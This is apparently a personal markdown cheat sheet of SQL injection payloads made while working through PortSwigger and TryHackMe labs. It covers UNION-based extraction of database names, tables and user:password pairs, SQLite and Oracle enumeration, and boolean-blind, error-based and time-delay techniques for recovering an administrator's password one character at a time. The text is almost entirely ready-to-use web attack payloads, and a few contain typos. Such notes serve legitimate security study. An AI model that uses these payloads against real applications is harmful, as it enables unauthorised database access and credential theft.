- `';--+-`
- `'--+-`
- `'` - if you get status code 500 the app might be vulnerable to SQLi.
- `admin123' UNION SELECT 1,2,3 where database() like 's%';-- -`
- `' UNION SELECT database(),concat(user, ":", password)  FROM users;-- -`
- `' UNION SELECT database(),table_name FROM information_schema.tables;-- -`
- `' UNION SELECT database(),column_name FROM information_schema.columns WHERE table_name='users';-- -`
- `' UNION SELECT @@version,2;-- -`
- Time: `' UNION SELECT SLEEP(5),2;-- -`
- find the number of columns: `' UNION SELECT NULL,NULL;-- -`
- ` UNION SELECT user,password from users;-- -`
- [SQLi PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLi Union Attacks PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks) 
- [SQLi THM](https://tryhackme.com/r/room/sqlinjectionlm)
- [SQLi cheat sheet PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQLite
- keywords are **case insensitive**
- `' Union Select name from sqlite_master where type='table`
- dump all the tables: `' Union Select Group_concat(name, ', ') from sqlite_master where type='table`
- ` Union Select Group_concat(username || ':' || password, ', ') from admintable'`
- dump structure of table: ` Union Select sql from sqlite_master where name='admintable`
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


### Portswigger
### Listing the contents of an Oracle database

On Oracle, you can find the same information as follows:

- You can list tables by querying `all_tables`:
    `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`:
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

- Oracle requires a `FROM` clause in every `SELECT`. If you want to return a constant, expression, or function result without querying a real table, you use `DUAL`. via ChatGPT
	-  example: `' UNION SELECT NULL,NULL FROM DUAL --`
- [ALL_TABLES docs](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)
-  you can concat strings with `||`

### Blind SQLi

- https://portswigger.net/web-security/sql-injection/blind
- no error message is displayed on the page, but a message like "Welcome back" or "Success" displayed whenever a row is returned from the SQL query. 
- check if table `users` exists:
- `' OR (SELECT 'a' FROM users LIMIT 1)='a` 
- `' OR SUBSTRING((SELECT password FROM users WHERE username='administator')1,1)='a`
	-  takes the first letter of `administrator`'s password and checks if it's equal to `a`
	-  you can apply comparison operations like `SUBSTRING((SELECT password from users WHERE username='administrator'),1,1)>'a`
- determine length of password:
	- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`


### Error-based SQLi
- `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
	- if username = 'administrator' and password starts with `m` -> output error
	- else app behaves normally.
- check [Portswagger cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Visible error-based SQL injection
- `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--`
	- if the database is misconfigured it should throw an error like: ERROR: invalid input syntax for type integer: "2x2i4tqll4ctr686jsx2".
	- the value between the double quotes is the password.

### Blind SQL injection with time delays and information retrieval
- `1'%3b+SELECT+CASE+WHEN+SUBSTRING((SELECT+passwword+FROM+users+WHERE+username%3d'administrator'),1,{len(password)+1})%3d'{password}{char}'+THEN+pg_sleep(3)+ELSE+pg_sleep+(0)+END--`
 
- DON'T FORGET TO ENCODE THE COOKIE, you can use burp suite for this.
- the value between the double quotes is the password.
![[url_encoding_vs_base64encoding.png]]